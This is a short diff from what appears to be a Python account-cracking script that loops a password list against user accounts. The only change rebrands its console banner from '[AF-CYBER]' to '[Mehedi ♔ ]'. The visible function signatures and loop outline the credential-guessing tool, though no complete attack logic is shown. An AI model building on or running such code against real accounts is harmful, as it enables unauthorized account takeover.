@@ -443,7 +443,7 @@ def live_ck(uid):
 
 def file_subb(Gmail,psslist):
     global oks,done
-    sys.stdout.write(f"\r  \033[38;5;46m[AF-CYBER] {done}|{str(len(oks))}\r");sys.stdout.flush()
+    sys.stdout.write(f"\r  \033[38;5;46m[Mehedi ♔ ] {done}|{str(len(oks))}\r");sys.stdout.flush()
     session=requests.Session()
     try:
         for ps in psslist:
